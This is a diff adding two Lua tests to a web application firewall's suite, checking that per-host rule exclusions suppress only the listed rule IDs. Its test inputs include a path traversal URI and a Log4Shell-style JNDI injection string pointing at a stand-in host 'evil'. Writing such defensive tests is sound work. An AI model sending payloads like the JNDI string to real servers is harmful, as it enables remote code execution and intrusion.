@@ -303,6 +303,43 @@ do
   end
 end
 
+-- ── Test 17: ctx.skip_rule_ids suppresses excluded rule hits ─────────────────
+-- Per-vhost rule exclusions: when an operator excludes a rule for a host, the
+-- detector still runs but record() drops the hit. Verify no leak into hits[]
+-- or the strongest-action return tuple.
+do
+  disable_all_rules()
+  waf.set_rule("rule_traversal", "challenge")
+  -- Rule fires (uri = "/foo/../"), but skip_rule_ids = {[101]=true} should
+  -- suppress it as if the rule were disabled for this host.
+  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
+    uri = "/foo/../",
+    skip_rule_ids = { [101] = true },
+  }))
+  check(hit == false,                "17: skip_rule_ids — rule 101 suppressed, no hit")
+  check(reason == nil,               "17: skip_rule_ids — reason nil")
+  check(action == nil,               "17: skip_rule_ids — action nil")
+  check(hits == nil or #hits == 0,   "17: skip_rule_ids — hits empty")
+end
+
+-- ── Test 18: skip_rule_ids only suppresses the listed IDs; others still fire ─
+do
+  disable_all_rules()
+  waf.set_rule("rule_traversal", "logonly")  -- ID 101 — to be skipped
+  waf.set_rule("rule_rce",       "block")    -- ID 320 — must still fire
+
+  local hit, _reason, _ttl, action, hits, rule_id = waf.check(fresh_ctx({
+    uri  = "/foo/../",
+    args = "x=${jndi:ldap://evil/}",
+    skip_rule_ids = { [101] = true },
+  }))
+  check(hit == true,         "18: skip_rule_ids — non-excluded rule (320) still fires")
+  check(action == "block",   "18: skip_rule_ids — block action survives")
+  check(rule_id == 320,      "18: skip_rule_ids — strongest rule_id is RCE")
+  check(#hits == 1,          "18: skip_rule_ids — only 1 hit recorded (101 was suppressed)")
+  check(hits[1].waf_rule_id == 320, "18: skip_rule_ids — hits[1] is RCE not traversal")
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
